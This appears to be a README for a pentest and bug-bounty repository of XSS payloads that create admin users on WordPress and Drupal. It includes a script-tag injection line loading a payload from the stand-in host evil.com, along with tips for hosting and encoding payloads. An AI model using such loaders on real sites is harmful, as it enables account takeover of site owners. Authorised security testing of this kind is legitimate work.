# Weaponised XSS Payloads
_XSS payloads designed to turn alert(1) into P1._

## The Blog Post
This repo was released alongside a blogpost titled "How to Upgrade Your XSS Bugs from Medium to Critical" https://medium.com/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4

## What is this?

In this repository you will find a bunch of JavaScript files which can be loaded into an XSS payload in order to perform sensitive functions on popular CMS platforms in the context of the victim's browser. This can help to chain a plain old XSS bug into something more critical, like an account takeover.

This is perfect for beefing up the severity of a pentest or bug bounty report by demonstrating real security impact.

Currently, there are only two payloads, one for adding an admin user in Wordpress, and one for adding an admin user in Drupal. There are plenty more to come, if you can help out - pull requests are welcome!

## How To

The simplest way to use these payloads is to host them somewhere and load them into the src attribute of a script tag for your XSS payload like this:

```
<script src="http://evil.com/wordpress_create_admin_user.js"></script>
```

Alternatively, depending on the context and length of the payload, it can sometimes be [minified](https://javascript-minifier.com/), [encoded](https://eve.gd/2007/05/23/string-fromcharcode-encoder/) and then just included directly into the request.

In order to host the JavaScript file, you may need to set the Content-Type to `application/javascript`. To achieve this with PHP, you can simply prepend this line to the top of any of the payloads, save it as a .php file and host it on your PHP-enabled webserver:

```
<?php header("Content-Type: application/javascript"); ?>
```


## Credits

[This article](https://www.shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/) from Shift8 is what inspired me to make this repo. The JS in the article has a couple of minor typos but the concepts are spot on.
